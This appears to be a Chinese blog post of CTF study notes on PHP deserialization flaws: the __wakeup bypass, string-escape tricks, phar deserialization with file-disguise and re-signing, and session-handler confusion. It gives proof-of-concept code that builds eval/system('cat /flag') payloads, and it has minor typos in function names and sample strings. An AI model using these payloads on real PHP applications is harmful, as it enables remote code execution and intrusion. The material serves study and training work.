# PHP反序列化


# PHP反序列化漏洞

## 漏洞产生原理

反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。

## 常见魔术方法

```__invoke()```:当尝试以调用函数的方式调用对象的时候，就会调用该方法

```__construst()```:具有构造函数的类在创建新对象的时候，回调此方法

```__destruct()```:反序列化的时候，或者对象销毁的时候调用

```__wakeup()```:反序列化的时候调用

```__sleep()```:序列化的时候调用

```__toString()```:把类当成字符串的时候调用，一般在echo处生效

```__set()```:在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用

```__get()```:读取不可访问或者不存在的属性的时候，进行赋值

```__call()```:在对象中调用一个不可访问的方法的时候，会被执行

## 漏洞实例

### wakeup()绕过

#### 修改变量数出发漏洞

&gt; CVE-2016-7124

```
&lt;?php
class A{
    var $target = &#34;test&#34;;
    function __wakeup(){
        $this-&gt;target = &#34;wakeup!&#34;;
    }
    function __destruct(){
        $fp = fopen(&#34;C:\\phpstudy_pro\\WWW\\unserialize\\shell.php&#34;,&#34;w&#34;);
        fputs($fp,$this-&gt;target);
        fclose($fp);
    }
}

$test = $_GET[&#39;test&#39;];
$test_unseria = unserialize($test);

echo &#34;shell.php&lt;br/&gt;&#34;;
include(&#34;.\shell.php&#34;);
?&gt;
```

代码正常的执行逻辑:

* unserialize( )会检查是否存在一个_wakeup( )方法。_

* 本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为&#34;wakeup!&#34;。

  &gt; [!NOTE]
  &gt;
  &gt; 不管用户传入的序列化字符串中的target属性为何值，**wakeup()都会把$target的值重置为&#34;wakeup!&#34;**

* 由于我们需要修改值，所以就需要绕过wakeup()进行我们的反序列化。

这个可以通过修改序列化之后那串内容具体有几个参数来绕过

例如：

```
O:1:&#34;X&#34;:1:{s:1:&#34;x&#34;;s:13:&#34;fllllllag.php&#34;;}	# 原
O:1:&#34;X&#34;:2:{s:1:&#34;x&#34;;s:13:&#34;fllllllag.php&#34;;}	# 改
```

#### 通过变量数值修改属性个数

#### 变量引用

**poc**

```
&lt;?php
show_source(__FILE__);

###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this-&gt;a=1;
        $this-&gt;b=2;
        $this-&gt;c=3;
    }
    public function __wakeup(){
        $this-&gt;a=&#39;&#39;;
    }
    public function __destruct(){
        $this-&gt;b=$this-&gt;c;
        eval($this-&gt;a);
    }
}

$flag = new test();
$flag-&gt;b = &amp;$flag-&gt;a;
$flag-&gt;c = &#34;system(&#39;cat /fffffffffflagafag&#39;);&#34;;

echo urlencode(serialize($flag));
```



#### 直接去掉最后一个括号

&gt; 原理是出现这个序列化字符串报错导致直接触发__destruct



### PHP反序列化字符逃逸

#### 逃逸原理

反序列化时，是以`}`来进行结尾的，同时在字符串内，是以关键字后面的数字来规定所读取的内容的长度。

#### 过滤后字符变多

&gt; 原理是出现这个序列化字符串报错导致直接触发__destruct

正常反序列化

```
&lt;?php
class A{
	public $a=&#39;qqqqqqq&#39;;
	public $b=&#39;21&#39;;
}
function filter($a){
	$filter=&#39;/q/i&#39;;
	return preg_replace($filter,&#39;ww&#39;,$a);
}
$a=new A;
echo serialize($a);
```

运行结果

```
string(45)&#34;O:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:1:&#34;q&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;
```

##### 关键函数

&gt; 【将序列化后的值，将所有的`&#39;q&#39;`变为`&#39;ww&#39;`】

```
function filter($a){
    $filter=&#39;/q/i&#39;;
    return preg_replace($filter,&#39;ww&#39;,$a);
}
```

##### 目的

要将反序列后`$b`的值变为我们想要的值。

带过滤的源码

```
&lt;?php
class A{
	public $a=&#39;qqqqqqq&#39;;
	public $b=&#39;21&#39;;
 
	function filter($a){
        $filter=&#39;/q/i&#39;;
        return preg_replace($filter,&#39;ww&#39;,$a);
    }
}
$a=new A;
echo serialize($a));
echo&#39;&lt;pre&gt;&#39;;
$r=filter(serialize($a));
echo $r;
```

运行结果

```
O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;s:7:&#34;qqqqqqa&#34;;s:1:&#34;b&#34;s:2:&#34;21&#34;;}

0:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:7:&#34;wwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}
```

假设我们想要`$b=104`，构造的`$b`的值的序列化后为:

```
&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}
```

其中`&#34;;`是用来闭合的

##### 逃逸方法

如果直接等于`&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}`的结果：

```
0:1:&#34;A&#34;:2{s:1:&#34;a&#34;s:28:&#34;qqqqqqq&#34;s:1:&#34;b&#34;s3:&#34;104&#34;;}&#34;s:1:&#34;b&#34;s:2:&#34;21&#34;;}

0:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:28:&#34;wwwwwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}
```

如果我们把`s:28`后面的内容以字符串按要求填满了28个，那么s:1:&#34;b&#34;;s:3:&#34;104&#34;;}就会被包含在序列化字符串内。

而`}”`后面的内容，即`;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;`就不会被认为是序列化字符串的内容，从而执行了我们构造的&#34;`;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}`，即让一个成员`b`的值为`104`。

构造：在上面，只要让`&#39;w&#39;`字符的数量按要求达到s:后面所要求的的数量（28）即可。

在`filter`函数中，一个`q`被换成了两个`w`，所以让`q`的数量等于```&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}```的字符串长度就行了。因为`&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}`的字符串长度为21，让```q```的数量为21，反序列化后`A`的值的长度为就是**q的数量加上```&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}```**  的长度（42），在`filter()`之后，```w```的数量就是刚好42，而我们**添加上去的字符串就会被逃逸出来，会在反序列化的时候成功执行**。

最终

```
&lt;?php
class A{
    public $a=&#39;qqqqqqqqqqqqqqqqqqqqq&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#39;;
    public $b=&#39;21&#39;;
 
}function filter($a){
    $filter=&#39;/q/i&#39;;
    return preg_replace($filter,&#39;ww&#39;,$a);
}
$a=new A;
var_dump(serialize($a));
echo&#39;&lt;pre&gt;&#39;;
$r=filter(serialize($a));
var_dump($r);
```

得到：

```
string(87) &#34;O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;;s:42:&#34;qqqqqqqqqqqqqqqqqqqqq&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;
string(108) &#34;O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;;s:42:&#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;
```

然后再进行反序列化就可以发现，$b的值变成了104。

```
print_r(unserialize($r));
```

**综述：**
让字符&#39;w&#39;占用了原本属于&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;}的位置，从而让&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;}逃逸出去而成功执行。

#### 过滤后字符变少

源码

```
&lt;?php
function str_rep($string){
    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);
}

$test[&#39;name&#39;] = $_GET[&#39;name&#39;];
$test[&#39;sign&#39;] = $_GET[&#39;sign&#39;]; 
$test[&#39;number&#39;] = &#39;2020&#39;;
$temp = str_rep(serialize($test));
printf($temp);
$fake = unserialize($temp);
echo &#39;&lt;br&gt;&#39;;
print(&#34;name:&#34;.$fake[&#39;name&#39;].&#39;&lt;pr&gt;&#39;);
print(&#34;sign:&#34;.$fake[&#39;sign&#39;].&#39;&lt;pr&gt;&#39;);
print(&#34;number:&#34;.$fake[&#39;number&#39;].&#39;&lt;pr&gt;&#39;);
?&gt;
```

这段代码是接收了参数name和sign，且number是固定的

经过了序列化=&gt;正则匹配替换字符串减少=&gt;反序列化的过程后输出结果

我们的目的就是通过控制传参name和sign，间接改变number

##### 逃逸方法

sign中传`&#34;;s:6:&#34;number&#34;;s:4:&#34;2000&#34;;}`无法使用

由于sign的字符串个数为27，所以后面的`&#34;;s:6:&#34;number&#34;;s:4:&#34;2000&#34;;}`的payload被当作了字符串sign的值，而没有被当作序列化语句去反序列化

因此需要过滤函数了给我们实现字符逃逸

我们需要的payload雏形：

```
a:3:{s:4:&#34;name&#34;;s:24:&#34;&#34;;s:4:&#34;sign&#34;;s:54:&#34;hello&#34;;s:4:&#34;sign&#34;;s:4:&#34;eval&#34;;s:6:&#34;number&#34;;s:4:&#34;2000&#34;;}&#34;;s:6:&#34;number&#34;;s:4:&#34;2020&#34;;}
```

需要放入的test的个数有24个字符串（也就是name的值）

#### 字符串逃逸综述

1. 字符串增加：

   构造的序列化加在qqqq（就是值有很多qqqq的）那个变量里。字符串减少：构造的序列化加在另一个变量里。

   * 构造的序列化语句和过滤的值在同一个变量
   * 构造过滤的值的个数就是构造的序列化语句的字符串个数

2. 字符串减少：

   字符串`&#39;qqqqxxx&#39;`的数量依照构造的那个序列化字符串的长度。字符串减少：字符串`&#39;qqqqxxx&#39;`的数量依照`O:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:44:&#34;wwwwwwwwwwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:22:&#34;A&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;}`中替换部分的长度。

   * 构造的序列化语句和过滤的值不在同个变量里
   * 构造过滤的值是name的值的个数

### phar反序列化

#### 利用条件

* phar文件可上传
* 文件流操作函数如`file_exists()`，`file_get_contents()`等影响函数要有可利用的魔术方法做跳板
* 文件流参数可控，且`phar://`没有被过滤，或可绕过

#### 影响函数

* filetime()
* filectime()
* file_exits()
* file_get_contents()
* file_put_contents()
* file()
* filegroup()
* fopen()
* fileinode()
* filetime()
* fileowner()
* fileperms()
* is_dir()
* is_executable()
* is_file()
* is_link()
* is_readable()
* is_writable()
* is_writeable()
* parse_ini_file()
* copy()
* unlike()
* stat()
* readfile()

#### 构造phar文件

```
&lt;?php
class LoveNss{
    public $ljt=&#34;Misc&#34;;
    public $dky=&#34;Re&#34;;
    public $cmd=&#34;system(&#39;cat /flag&#39;);&#34;;
}

$a = new LoveNss();
echo serialize($a);

# 下面这部分就没改
$phar = new Phar(&#34;phar.phar&#34;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); // 设置 stub

$phar-&gt;setMetadata($a); // 将自定义的 meta-data 存入 manifest
$phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); // 添加要压缩的文件
// 签名自动计算
$phar-&gt;stopBuffering();
```

读取这个直接`phar://文件名`

&gt; 记得加上文件相对位置

#### 绕过方法

1. `compress.bzip2://phar://`

2. `compress.zlib://phar:///`

3. `php://filter/resource=phar://`

4. `$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;`

5. **绕过__HALT_COMPILER ();检测**

   php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();?&gt;`

   这段代码，对前面的内容或者后缀名是没有要求的。

   那么我们就可以通过添加任意的文件头&#43;修改后缀名的方式将phar文件伪装成其他格式的文件。

   ```
   &lt;?php
   system(&#34;gzip newtest.phar&#34;);
   
   // 将压缩后的1.phar文件重命名为1.jpg
   rename(&#34;newtest.phar.gz&#34;, &#34;1.jpg&#34;);
   ```

​	最后把文件上传后在删除文件处抓包，`?filename=phar://1.jpg`即可

6. **绕过`__construct`**

   先010里面把序列化字符修改成员数

   然后重新签名

   ```python
   from hashlib import sha1
   with open(&#39;phar.phar&#39;, &#39;rb&#39;) as file:
       f = file.read() 
   s = f[:-28] # 获取要签名的数据
   h = f[-8:] # 获取签名类型和 GBMB 标识
   newf = s &#43; sha1(s).digest() &#43; h # 数据 &#43; 签名 &#43; (类型 &#43; GBMB)
   with open(&#39;newtest.phar&#39;, &#39;wb&#39;) as file:
       file.write(newf) # 写入新文件
   ```

   

#### session反序列化

##### 漏洞原理

`//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);`
`//ini_set(&#34;session.serialize_handler&#34;, &#34;php_serialize&#34;);`
当php_serialize处理器处理接收session，php处理器处理session时便会造成反序列化的可利用

因为php处理器是有一个`|`间隔符，当php_serialize处理器传入时在序列化字符串前加上`|`，即`|O:7:&#34;xiaoxin&#34;:1:{s:4:&#34;name&#34;;s:7:&#34;xiaoxin&#34;;}&#34;`

此时session值为`a:1:{s:7:&#34;session&#34;;s:44:&#34;|O:7:&#34;xiaoxin:1:{s:4:&#34;name&#34;;s:7:&#34;xiaoxin&#34;;}&#34;;}`当php处理器处理时，会把`|`当作间隔符，取出后面的值去反序列化，即是我们构造的payload：

`|O:7:&#34;xiaoxin:1:{s:4:&#34;name&#34;;s:7:&#34;xiaoxin&#34;;}&#34;`


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/  

